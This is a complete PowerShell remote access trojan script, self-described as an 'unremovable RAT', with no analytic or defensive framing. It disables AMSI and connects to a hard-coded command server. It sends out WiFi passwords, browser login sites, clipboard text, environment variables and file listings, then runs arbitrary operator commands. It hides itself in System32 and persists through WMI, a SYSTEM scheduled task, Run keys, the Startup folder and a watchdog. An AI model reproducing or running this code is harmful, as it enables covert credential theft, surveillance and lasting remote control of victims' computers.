#Requires -RunAsAdministrator
# Complete Unremovable RAT - MAXIMUM DATA EXTRACTION

[Ref].Assembly.GetTypes()|ForEach-Object{if($_.Name -like "*iUtils"){$_.GetFields('NonPublic,Static')|ForEach-Object{if($_.Name -like "*Context"){$_.SetValue($null,[IntPtr]::Zero)}}}}

$C2_IP = "152.53.38.5"
$C2_PORT = 4443
$FILENAME = "windowsgui.ps1"

# Main RAT Payload with MAXIMUM data extraction
$payload = @"
while (`$true) {
    try {
        `$client = New-Object System.Net.Sockets.TCPClient('$C2_IP', $C2_PORT)
        `$stream = `$client.GetStream()
        `$writer = New-Object System.IO.StreamWriter(`$stream)
        `$buffer = New-Object System.Byte[] 8192
        `$encoding = New-Object System.Text.AsciiEncoding
        
        `$writer.WriteLine("="*100)
        `$writer.WriteLine("COMPLETE DATA EXTRACTION - `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
        `$writer.WriteLine("Computer: `$env:COMPUTERNAME | User: `$env:USERNAME | Domain: `$env:USERDOMAIN")
        `$writer.WriteLine("="*100)
        `$writer.Flush()
        Start-Sleep -Seconds 1
        
        # === WIFI PASSWORDS ===
        `$writer.WriteLine("`n[1] WIFI PASSWORDS")
        `$writer.WriteLine("-"*80)
        try {
            `$profiles = (netsh wlan show profiles) | Select-String "All User Profile"
            foreach (`$line in `$profiles) {
                `$profileName = (`$line -split ":")[-1].Trim()
                `$passInfo = netsh wlan show profile name="`$profileName" key=clear | Select-String "Key Content"
                if (`$passInfo) {
                    `$password = (`$passInfo -split ":")[-1].Trim()
                    `$writer.WriteLine("`$profileName = `$password")
                }
            }
        } catch { `$writer.WriteLine("No WiFi available") }
        `$writer.Flush()
        
        # === NETWORK INFORMATION ===
        `$writer.WriteLine("`n[2] NETWORK INFORMATION")
        `$writer.WriteLine("-"*80)
        `$writer.WriteLine((ipconfig /all | Out-String))
        `$writer.WriteLine("`nRouting Table:")
        `$writer.WriteLine((route print | Out-String))
        `$writer.WriteLine("`nARP Cache:")
        `$writer.WriteLine((arp -a | Out-String))
        `$writer.Flush()
        
        # === SYSTEM INFORMATION ===
        `$writer.WriteLine("`n[3] SYSTEM INFORMATION")
        `$writer.WriteLine("-"*80)
        `$writer.WriteLine((systeminfo | Out-String))
        `$writer.Flush()
        
        # === BROWSER SAVED LOGINS ===
        `$writer.WriteLine("`n[4] BROWSER SAVED LOGIN SITES")
        `$writer.WriteLine("-"*80)
        try {
            `$browsers = @{
                "Chrome" = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
                "Edge" = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
                "Brave" = "`$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
            }
            foreach (`$browserName in `$browsers.Keys) {
                `$dbPath = `$browsers[`$browserName]
                if (Test-Path `$dbPath) {
                    `$writer.WriteLine("[`$browserName Browser]")
                    `$tempDb = "`$env:TEMP\`$browserName`_temp.db"
                    Copy-Item `$dbPath `$tempDb -Force -ErrorAction SilentlyContinue
                    if (Test-Path `$tempDb) {
                        `$bytes = [System.IO.File]::ReadAllBytes(`$tempDb)
                        `$text = [System.Text.Encoding]::UTF8.GetString(`$bytes)
                        `$urls = [regex]::Matches(`$text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | 
                                Select-Object -ExpandProperty Value -Unique | Select-Object -First 30
                        foreach (`$url in `$urls) { `$writer.WriteLine("  `$url") }
                        Remove-Item `$tempDb -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        } catch { `$writer.WriteLine("Browser extraction failed") }
        `$writer.Flush()
        
        # === RUNNING PROCESSES ===
        `$writer.WriteLine("`n[5] RUNNING PROCESSES (Top 20)")
        `$writer.WriteLine("-"*80)
        `$processes = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, WorkingSet
        `$writer.WriteLine((`$processes | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === INSTALLED PROGRAMS ===
        `$writer.WriteLine("`n[6] INSTALLED PROGRAMS (Top 30)")
        `$writer.WriteLine("-"*80)
        `$programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
                    Where-Object { `$_.DisplayName } | 
                    Select-Object DisplayName, DisplayVersion -First 30
        `$writer.WriteLine((`$programs | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === USER ACCOUNTS ===
        `$writer.WriteLine("`n[7] LOCAL USER ACCOUNTS")
        `$writer.WriteLine("-"*80)
        `$users = Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
        `$writer.WriteLine((`$users | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === CLIPBOARD CONTENTS ===
        `$writer.WriteLine("`n[8] CLIPBOARD CONTENTS")
        `$writer.WriteLine("-"*80)
        try {
            Add-Type -AssemblyName System.Windows.Forms
            `$clipboard = [System.Windows.Forms.Clipboard]::GetText()
            if (`$clipboard) { `$writer.WriteLine(`$clipboard) }
            else { `$writer.WriteLine("Clipboard is empty") }
        } catch { `$writer.WriteLine("Could not access clipboard") }
        `$writer.Flush()
        
        # === RECENT DOCUMENTS ===
        `$writer.WriteLine("`n[9] RECENT DOCUMENTS")
        `$writer.WriteLine("-"*80)
        `$recent = Get-ChildItem "`$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | 
                  Select-Object -First 20 Name, LastWriteTime
        `$writer.WriteLine((`$recent | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === STARTUP PROGRAMS ===
        `$writer.WriteLine("`n[10] STARTUP PROGRAMS")
        `$writer.WriteLine("-"*80)
        `$writer.WriteLine("Registry Run Keys:")
        `$runKeys = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
        `$runKeys.PSObject.Properties | Where-Object {`$_.Name -notlike 'PS*'} | ForEach-Object {
            `$writer.WriteLine("  `$(`$_.Name): `$(`$_.Value)")
        }
        `$writer.Flush()
        
        # === NETWORK CONNECTIONS ===
        `$writer.WriteLine("`n[11] ACTIVE NETWORK CONNECTIONS")
        `$writer.WriteLine("-"*80)
        `$writer.WriteLine((netstat -ano | Out-String))
        `$writer.Flush()
        
        # === SHARED FOLDERS ===
        `$writer.WriteLine("`n[12] SHARED FOLDERS")
        `$writer.WriteLine("-"*80)
        `$shares = Get-SmbShare -ErrorAction SilentlyContinue
        if (`$shares) { `$writer.WriteLine((`$shares | Format-Table -AutoSize | Out-String)) }
        else { `$writer.WriteLine("No shared folders") }
        `$writer.Flush()
        
        # === USB DEVICES ===
        `$writer.WriteLine("`n[13] USB DEVICES")
        `$writer.WriteLine("-"*80)
        `$usb = Get-PnpDevice -Class USB -ErrorAction SilentlyContinue | Where-Object {`$_.Status -eq 'OK'}
        `$writer.WriteLine((`$usb | Select-Object FriendlyName, InstanceId | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === ENVIRONMENT VARIABLES ===
        `$writer.WriteLine("`n[14] ENVIRONMENT VARIABLES")
        `$writer.WriteLine("-"*80)
        Get-ChildItem Env: | ForEach-Object { `$writer.WriteLine("`$(`$_.Name) = `$(`$_.Value)") }
        `$writer.Flush()
        
        # === DESKTOP FILES ===
        `$writer.WriteLine("`n[15] DESKTOP FILES")
        `$writer.WriteLine("-"*80)
        `$desktop = Get-ChildItem "`$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime
        `$writer.WriteLine((`$desktop | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === DOCUMENTS FOLDER ===
        `$writer.WriteLine("`n[16] DOCUMENTS FOLDER")
        `$writer.WriteLine("-"*80)
        `$docs = Get-ChildItem "`$env:USERPROFILE\Documents" -ErrorAction SilentlyContinue | Select-Object -First 30 Name, LastWriteTime
        `$writer.WriteLine((`$docs | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        # === DOWNLOADS FOLDER ===
        `$writer.WriteLine("`n[17] DOWNLOADS FOLDER")
        `$writer.WriteLine("-"*80)
        `$downloads = Get-ChildItem "`$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue | Select-Object -First 30 Name, LastWriteTime
        `$writer.WriteLine((`$downloads | Format-Table -AutoSize | Out-String))
        `$writer.Flush()
        
        `$writer.WriteLine("`n" + "="*100)
        `$writer.WriteLine("AUTO-EXTRACTION COMPLETE")
        `$writer.WriteLine("="*100)
        `$writer.WriteLine("`n[READY FOR MANUAL COMMANDS]`n")
        `$writer.Flush()
        
        # Command loop
        while ((`$read = `$stream.Read(`$buffer, 0, `$buffer.Length)) -gt 0) {
            `$command = `$encoding.GetString(`$buffer, 0, `$read).Trim()
            if (`$command -eq 'exit') { break }
            
            try {
                `$output = Invoke-Expression `$command 2>&1 | Out-String
                `$writer.WriteLine(`$output)
            } catch {
                `$writer.WriteLine("Error: `$_")
            }
            `$writer.Flush()
        }
        
        `$client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
"@

# [Rest of installation code - same as before]
Write-Host "[*] Installing to multiple locations..." -ForegroundColor Cyan
$locations = @(
    "$env:SystemRoot\System32\$FILENAME",
    "$env:ProgramData\Microsoft\Windows\$FILENAME",
    "$env:SystemRoot\Tasks\$FILENAME"
)

foreach ($path in $locations) {
    New-Item -Path (Split-Path $path) -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $payload | Out-File $path -Force
    attrib +h +s "$path"
}
Write-Host "[+] Files installed and hidden" -ForegroundColor Green

# WMI Persistence
Write-Host "[*] Installing WMI persistence..." -ForegroundColor Cyan
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsGUI'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsGUI'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {$_.Consumer -like "*WindowsGUI*"} | Remove-WmiObject

$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WindowsGUI"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 90 AND TargetInstance.SystemUpTime < 150"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WindowsGUI"
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$FILENAME`""
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer} | Out-Null
Write-Host "[+] WMI persistence installed" -ForegroundColor Green

# Scheduled Task
Write-Host "[*] Installing scheduled task..." -ForegroundColor Cyan
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$FILENAME`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "WindowsGUIService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
Write-Host "[+] Scheduled task installed" -ForegroundColor Green

# Registry persistence
Write-Host "[*] Installing registry persistence..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsGUI" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$FILENAME`"" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsGUI" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:ProgramData\Microsoft\Windows\$FILENAME`"" -Force
Write-Host "[+] Registry persistence installed" -ForegroundColor Green

# Startup folder
Copy-Item "$env:SystemRoot\System32\$FILENAME" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$FILENAME" -Force
attrib +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$FILENAME"

# Watchdog
$watchdog = @"
while (`$true) {
    Start-Sleep -Seconds 300
    if (-not (Test-Path "$env:SystemRoot\System32\$FILENAME")) {
        Copy-Item "$env:ProgramData\Microsoft\Windows\$FILENAME" "$env:SystemRoot\System32\$FILENAME" -Force
    }
    `$running = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.CommandLine -like "*$FILENAME*"}
    if (-not `$running) {
        Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$FILENAME`"" -WindowStyle Hidden
    }
}
"@
$watchdog | Out-File "$env:SystemRoot\System32\watchdog_gui.ps1" -Force
attrib +h +s "$env:SystemRoot\System32\watchdog_gui.ps1"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\watchdog_gui.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemGUIWatchdog" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# Start now
Write-Host "[*] Starting RAT..." -ForegroundColor Cyan
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$FILENAME`"" -WindowStyle Hidden
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\watchdog_gui.ps1`"" -WindowStyle Hidden

Write-Host "`n[SUCCESS] MAXIMUM EXTRACTION RAT INSTALLED!" -ForegroundColor Green
Write-Host "[+] Auto-extracts 17 categories of data on every connection" -ForegroundColor Cyan
Write-Host "[+] C2 Server: $C2_IP`:$C2_PORT" -ForegroundColor Cyan
Write-Host "[+] Unremovable persistence active" -ForegroundColor Cyan
